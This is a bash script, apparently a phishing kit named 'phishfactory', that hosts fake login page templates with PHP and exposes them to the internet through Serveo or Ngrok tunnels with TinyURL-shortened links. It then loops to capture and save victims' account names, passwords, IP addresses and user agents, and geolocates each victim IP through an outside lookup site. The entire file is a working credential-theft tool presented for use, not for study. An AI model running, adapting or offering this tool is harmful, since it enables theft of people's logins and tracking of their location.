#!/bin/bash
#simple script to fish web logins
#https://github.com/bartx84/fishfactory
#some themes included and integrated theme creator
#bartx [at] mail.com
version="1.0.0.1"
sites_dir="sites"
appdir=$(pwd)
sd="$appdir/$sites_dir"
declare -a directory
current_dir=""
NC='\033[0m'
RED='\033[1;31m'
GREEN='\033[1;92m'
YELLOW='\033[1;33m'
WHITE_ON_GREEN='\e[42m \e[1;37m '
CYAN="\033[1;36m"
MAGENTA="\033[1;35m"

function check_install_dependencies() {
if [ -e "$appdir/dependencies" ]
then
declare -a dependencies
dependencies=( `cat "$appdir/dependencies" | tr '\n' ' '`)  
fi
 echo -e "${RED}Check dependencies${NC}"
 count=0
 tlendep=${#dependencies[@]}
 	 for ((i=0; i<$tlendep; i++))
		 do
		 split_dep=( `echo "${dependencies[$i]}" | tr ';' '\n'`)  
		 depname=${split_dep[0]}
		 dep_rep_type=${split_dep[1]}
		 dep_rep_source=${split_dep[2]}
		 declare -a dep_status
		 dep_status=( `echo "$(whereis $depname)" | tr ':' '\n'`)  
		 tlendeps=${#dep_status[1]}
		 
				if [ $tlendeps == "0" ]
				then
					if [ $dep_rep_type == "apt" ]
					then
					echo -e "${RED}INSTALLING $depname${NC}"
					apt install $dep_rep_source -y
					else 
					echo -e "${GREEN}$depname installed${NC}"
					fi
								
				else 
				echo -e "${GREEN}$depname installed${NC}"
				fi
		 done 

}

function list_sites() {
myworkdir=$1
cd $myworkdir
echo -e "${GREEN} ____  _     _     _       _____          _    "               
echo -e "|  _ \| |__ (_)___| |__   |  ___|_ _  ___| |_ ___  _ __ _   _ "
echo -e "| |_) | '_ \| / __| '_ \  | |_ / _  |/ __| __/ _ \| '__| | | |"
echo -e "|  __/| | | | \__ \ | | | |  _| (_| | (__| || (_) | |  | |_| |"
echo -e "|_|   |_| |_|_|___/_| |_| |_|  \__,_|\___|\__\___/|_|   \__, |"
echo -e "                                    Version: $version    |___/ ${NC}"
echo -e ""
echo -e "\t\thttps://github.com/bartx84/phishfactory"
echo -e ""

count=0
        for i in $( ls -d */)
        do
			declare -a dirs
			declare -a menudirs
			dirs=( `echo "$i" | tr '/' '\n'`)
			dirname=${dirs[0]}
			directory[$count]=$dirname
			
			echo -e "[$count] - $dirname"
			let count=count+1
        done
        
        echo ""
        echo -e "${RED}[e] - Exit${NC}"
        echo ""
		echo -e -n "Select site to start:"
}

function main_menu() {
clear
list_sites $sd
tLen=${#directory[@]}

			until [ "$selection" = "e" ]; do
			  read selection
			  re='^[0-9]+$'
			  if ! [[ $selection =~ $re ]] 
			  then
			  list_sites $sd
			  elif  (("$selection" < "${tLen}"))
			  then target_directory=${directory[$selection]}
			  clear
			  current_dir=$sd/$target_directory
			  startsite $target_directory
			  else
			  list_sites $sd
			  fi  
			done
}

function startsite() {
site=$1
echo -e "${GREEN}Chose the tunneling methond${NC}"
echo -e ""
echo -e "[1] - No tunneling (Local)"
echo -e "[2] - Serveo"
echo -e "[3] - Ngrok"
echo -e ""
echo -e "${YELLOW}[b] - back${NC}"
echo -e "Chose an option"
read option
if [[ $option == 1 || $option == 01 ]]; then
clear
echo -e "${GREEN}Chose the PORT [80]${NC}"
read port
	if [[ $port == "" ]]; then
	port="80"
	start_php $site $port
	fi

elif [[ $option == 2 || $option == 02 ]]; then
clear
echo -e "${GREEN}Chose the PORT [3333]${NC}"
read port
	if [[ $port == "" ]]; then
	port="3333"
	fi
start_serveo $site $port

elif [[ $option == 3 || $option == 03 ]]; then
clear
echo -e "${GREEN}Chose the PORT [3333]${NC}"
read port
	if [[ $port == "" ]]; then
	port="3333"
	fi
start_ngrok $site $port

elif [ $option == "b" ]; then
clear
main_menu
fi
}

function start_php() {
clear
intip=$(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
extip=$(curl -s http://whatismyip.akamai.com/)
printf "${CYAN}Starting php server...\n${NC}"
cd $sd/$1 && php -S "$intip:$2" > /dev/null 2>&1 & 
cd $sd/$1 && php -S "$extip:$2" > /dev/null 2>&1 &
sleep 2

printf "${GREEN}Template: ${YELLOW}$1${NC}\n"
printf "${GREEN}Local ip: ${YELLOW}http://$intip\n"
printf "${GREEN}External ip: ${YELLOW}http://$extip${NC}\n"

check_log
}

function start_serveo() {
clear
printf "${CYAN}Starting php server...\n${NC}"
cd $sd/$1 && php -S 127.0.0.1:"$2" > /dev/null 2>&1 & 
sleep 2

printf "${MAGENTA}Starting SERVEO TUNNELING...${NC}\n"
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "${GREEN}Template: ${YELLOW}$1${NC}\n"
printf "${GREEN}Serveo link: ${YELLOW}$send_link${NC}\n"
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf "${GREEN}Tinyurl: ${YELLOW}$send_ip${NC}\n"
check_log
}

function  start_ngrok() {
clear
printf "${CYAN}Starting php server...\n${NC}"
cd $sd/$1 && php -S 127.0.0.1:"$2" > /dev/null 2>&1 & 
sleep 2

if [[ -e ngrok ]]; then
echo ""
else
printf "${RED}Downloading Ngrok...\n${NC}"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "${GREEN}Download error${NC}"
exit 1
fi
else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "${GREEN}Download error${NC}"
exit 1
fi
fi
fi

printf "${MAGENTA}Starting ngrok server...\n${NC}"
./ngrok http $2 > /dev/null 2>&1 &
sleep 10
printf "${GREEN}Template: ${YELLOW}$1${NC}\n"
get_ngrok=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "${GREEN}Ngrok link: ${YELLOW}$get_ngrok${NC}\n"
check_log

}

function catch_cred() {

account=$(grep -o 'Account:.*' $current_dir/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' $current_dir/usernames.txt | cut -d ":" -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
cat $current_dir/usernames.txt >> $current_dir/saved.usernames.txt
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m $current_dir/saved.usernames.txt\e[0m\n" $server
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Next IP and Next Credentials, Press Ctrl + C to exit...\e[0m\n"

}

function get_ip() {
touch $current_dir/saved.usernames.txt
ip=$(grep -a 'IP:' $current_dir/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' $current_dir/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m $current_dir/saved.ip.txt\e[0m\n" $server
cat $current_dir/ip.txt >> $current_dir/saved.ip.txt

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Credentials and Next IP, Press Ctrl + C to exit...\e[0m\n"

}

function check_log() {

printf "\n"
printf "${RED}Start logging...\n${NC}"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Credentials and Next IP, Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "$current_dir/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
get_ip
rm -rf $current_dir/ip.txt
fi
sleep 0.5
if [[ -e "$current_dir/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred
rm -rf $current_dir/usernames.txt
fi
sleep 0.5

done 

}

check_install_dependencies
clear
main_menu
